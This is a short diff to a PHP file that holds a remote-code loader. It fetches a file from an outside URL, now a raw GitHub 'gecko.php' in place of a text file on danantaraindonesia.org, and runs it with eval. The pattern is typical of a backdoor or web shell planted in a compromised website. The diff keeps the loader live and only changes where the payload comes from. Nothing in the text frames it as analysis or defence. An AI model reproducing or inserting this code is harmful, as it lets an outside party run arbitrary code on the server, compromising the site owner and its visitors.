@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://danantaraindonesia.org/tolol.txt');
+$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/gecko.php');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
